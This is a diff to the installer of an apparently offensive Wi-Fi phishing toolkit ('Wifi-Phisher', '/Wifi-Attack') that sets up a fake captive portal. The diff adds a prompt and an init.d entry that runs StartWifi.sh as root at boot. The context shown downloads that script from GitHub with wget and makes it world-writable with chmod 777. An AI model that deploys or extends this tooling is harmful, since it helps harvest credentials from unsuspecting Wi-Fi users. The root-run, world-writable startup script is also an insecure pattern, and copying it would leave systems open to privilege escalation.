@@ -14,6 +14,7 @@ read -p "Enter the wlan interface (normally it's: wlan0): " WIFI_INTERFACE
 read -p "Enter the domain of the Captive-Portal (Example: \"login.com\" [! No Protocol:(\"http://\"])): " WIFI_DOMAIN
 read -p "Enter the username for your dashboard: " DASH_USER
 read -p "Enter the password for your dashboard: " DASH_PASS
+read -p "Add the Starter-Script to autostart (yes,no): " ADD_TO_STARTUP
 
 #Make www folder
 mkdir /WWW
@@ -124,6 +125,20 @@ mv nginx.conf /Wifi-Attack/NginxConfig/nginx.conf
 wget -O StartWifi.sh https://raw.githubusercontent.com/MarcAndre-Wessner/Wifi-Phisher/master/StartWifi.sh
 mv StartWifi.sh /
 chmod 777 /StartWifi.sh
+
+
+#Add the script to startup
+if [ "$ADD_TO_STARTUP" == "yes" ]
+then
+
+#Create startup script
+touch /etc/init.d/startwifi
+chmod 777 /etc/init.d/startwifi
+echo '#!/bin/bash' > /etc/init.d/startwifi
+echo "sudo /StartWifi.sh" >> /etc/init.d/startwifi
+update-rc.d startwifi defaults
+
+fi
 
 #TODO: DOwnload the Example PORTAL
 
